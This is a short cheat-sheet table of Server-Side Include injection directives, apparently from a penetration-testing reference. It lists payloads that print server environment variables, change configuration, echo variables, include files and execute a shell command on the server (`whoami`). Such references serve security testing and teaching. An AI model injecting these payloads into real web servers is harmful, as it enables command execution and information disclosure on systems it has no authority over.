## SSI Injection - Directives

| Print variables         | `<!--#printenv -->`                                  |
| ----------------------- | ---------------------------------------------------- |
| Change config           | `<!--#config errmsg="Error!" -->`                    |
| Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
| Execute command         | `<!--#exec cmd="whoami" -->`                         |
| Include web file        | `<!--#include virtual="index.html" -->`              |
